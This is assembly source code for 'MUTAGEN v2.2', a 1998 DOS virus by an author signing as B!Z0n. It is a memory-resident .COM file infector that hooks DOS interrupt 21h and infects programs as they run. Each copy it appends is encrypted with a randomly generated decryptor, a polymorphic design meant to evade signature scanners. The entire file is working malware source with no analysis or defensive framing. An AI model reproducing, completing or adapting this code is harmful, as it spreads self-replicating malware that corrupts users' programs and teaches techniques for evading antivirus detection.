;------------------------------------------------------------------
;             MUTAGEN v2.2  (c) 1998 by B!Z0n //[BzZ]
;               Resident mutaton .COM file infector
;           BzZ Random De- Cryptor Generator v0.2 based
;------------------------------------------------------------------
MODEL TINY
CODESEG
STARTUPCODE
P386
;------------------------------------------------------------------
MajorVer = 2
MinorVer = 2
;------------------------------------------------------------------
Start:  mov     ax, 0055h
        mov     es, ax
        xor     di, di
        push    ax di           ;------------------------
        mov     eax, 5545455Dh  ;0055:0000  5D  pop     bp
        stosd                   ;           45  inc     bp
        mov     al, 0CFh        ;           45  inc     bp
        stosb                   ;           55  push    bp
        pop     eax             ;           CF  iret
        xor     bx, bx          ;------------------------
        mov     es, bx
        xchg    eax, dword ptr es:[bx]
        div     bx
        add     bp, offset Decryptor - $
        mov     di, bp
        add     di, Crypted-Decryptor
        db      081h, 0C7h      ; add di, decrlen
decrlen dw      0000h
        mov     cx, Fin - Decryptor
;------------------------------------------------------------------
Decryptor:
;------------------------------------------------------------------
        inc     di
        dec     cx
        jz      crypted
        jmp     bp
;------------------------------------------------------------------
Crypted:
        xchg    eax, dword ptr es:[bx]
        push    cs
        pop     es
;------------------------------------------------------------------
        sub     bp, Decryptor - Start
        mov     si, bp
        sub     bp, 100h
        add     bp, [bp+decrlen]
        mov     ax, 1998h
        int     21h
        jnc     Install
Exit:
        lea     si,[bp+ORIG_START]
        mov     di,100h
        push    di
        cld
        movsw
        movsb
        retn
;---------------------------------------------------------------
Install:
        mov     ax, 3521h
        int     21h
        mov     word ptr [bp+old21], bx
        mov     word ptr [bp+old21+2], es
;---------------------------------------------------------------
        push    cs
        pop     ax
        dec     ax
        mov     es, ax
        mov     bx, es:[3]
;---------------------------------------------------------------
        push    cs
        pop     es
        sub     bx, (offset fin - offset start + 15)/16
        sub     bx, 17 + offset fin
        mov     ah, 4ah
        int     21h
;---------------------------------------------------------------
        mov     bx, (offset fin - offset start + 15)/16 + 16 + offset fin
        mov     ah, 48h
        int     21h
;---------------------------------------------------------------
        dec     ax
        mov     es, ax
        mov     byte ptr es:[1], 8
;--------------------------------------------------------------
        inc     ax
        mov     es, ax
        mov     di, 100h
        mov     cx, Decryptor - Start
        cld
    rep movsb
        lea     si, [bp + Decryptor]
        mov     cx, finish - Decryptor
    rep movsb
;--------------------------------------------------------------
        mov     dx, offset virus
        mov     ax, 2521h
        push    es
        pop     ds
        int     21h
        push    cs cs
        pop     ds es
        jmp     Exit
;--------------------------------------------------------------
;--------------------------------------------------------------
Virus:  pushf
        cmp     ax, 1998h
        jne     No_ID
        popf
        stc
        retf    0002
No_ID:  push    ax
        sub     ax, 4B00h
        jnz     No_Exec
        call    Infect
No_Exec:
        pop     ax
        popf
;--------------------------------------------------------------
                db      0EAh    ; jmp far
old21           dd      ?
;--------------------------------------------------------------
Infect: pusha
        push    si di es ds dx ds
;--------------------------------------------------------------
        push    cs
        pop     ds
;--------------------------------------------------------------
        mov     ax, 3524H
        int     21h
        mov     word ptr [error], bx
        mov     word ptr [error+2], es
        mov     ax, 2524H
        mov     dx, offset allok
        int     21h
;--------------------------------------------------------------
        pop     ds dx
        push    dx ds
;--------------------------------------------------------------
        mov     ax, 4300h
        int     21h
        mov     word ptr cs:[Attrib], cx
;-------------------------------------------------------------
        mov     ax, 4301h                ;set the normal
        xor     cx, cx                   ;file atribtes
        int     21h                      ;
;-------------------------------------------------------------
        mov     ax, 3D02h                ;open the file
        int     21h                      ;for read/write
        xchg    bx, ax                   ;bx=handle
;-------------------------------------------------------------
        push    cs cs
        pop     ds es
;--------------------------------------------------------------
        mov     ah, 3Fh
        lea     dx, [Orig_Start]
        mov     cx, 0003h
        int     21h
        cmp     word ptr [Orig_Start], 'ZM'
        je      RestoreAttr
        cmp     byte ptr [Orig_Start], 0E9h
        je      RestoreAttr
;-------------------------------------------------------------
        mov     ax, 5700h
        int     21h
        mov     word ptr [Hour], cx
        mov     word ptr [Day], dx
;--------------------------------------------------------------
        mov     ax, 4202h
        call    L_Seek
;------------------------------------------------------------
        sub     ax, 3
        mov     word ptr [JmpOffs], ax
;------------------------------------------------------------
Mutanting:
        lea     si, Start
        lea     di, Finish
        mov     cx, Decryptor - Start
    rep movsb
;--------------------------------------------------------------
virlen    equ   Finish - Start
newdlen   equ   decrlen + virlen
;--------------------------------------------------------------
        lea     si, [Finish + virlen + (16 * 8) +2]
        in      ax, 40h
        mov     cx, ax
        and     cx, 0Fh    ; <=15
        or      cx, 04h    ; >=4
        call    RDCG
        mov     word ptr [newdlen], cx
        push    si
        lea     si, Decryptor
        mov     cx, Fin - Decryptor
    rep movsb
        pop     si
        mov     cx, Fin - Crypted
Crypting:
        dec     di
        call    si
        loop    Crypting
;--------------------------------------------------------------
        mov     ah, 40h
        mov     cx, word ptr [newdlen]
        add     cx, Fin - Start
        lea     dx, Finish
        int     21h
;--------------------------------------------------------------
        mov     ax, 4200h
        call    L_Seek
;--------------------------------------------------------------
        mov     ah, 40h
        mov     cx, 0003h
        lea     dx, Header
        int     21h
;--------------------------------------------------------------
        mov     word ptr cx, [Hour]
        mov     word ptr dx, [Day]
        mov     ax, 5701h
        int     21h
;--------------------------------------------------------------
RestoreAttr:
        mov     word ptr cx, [Attrib]
;--------------------------------------------------------------
        pop     ds dx
;--------------------------------------------------------------
        mov     ax, 4301h
        int     21h
CloseFile:
        mov     ah,3Eh
        int     21h
;----------------------------------------------------------
        mov     ax, 2524h
        lds     dx, Error
        int     21h
;----------------------------------------------------------
        pop     ds es di si
        popa
        ret
;--------------------------------------------------------------
L_Seek: xor     cx, cx
        xor     dx, dx
        int     21h
        ret
;--------------------------------------------------------------
allok:  xor     al, al
        iret
;------------------------------------------------------------------
VirName         db  0,'[MUTAGEN v'
Ver             db  '0'+ MajorVer
                db  '.'
                db  '0'+ MinorVer
                db  ']'
Author          db  0,'[B!Z0n //[BzZ]'
;------------------------------------------------------------------
include  rdcg2.inc
;--------------------------------------------------------------
Orig_Start      db      0CDh, 20h, 00h
Header          db      0E9h
;--------------------------------------------------------------
fin:
;--------------------------------------------------------------
JmpOffs         dw      ?
Error           dd      ?
Attrib          dw      ?
Hour            dw      ?
Day             dw      ?
;--------------------------------------------------------------
finish:
;--------------------------------------------------------------
end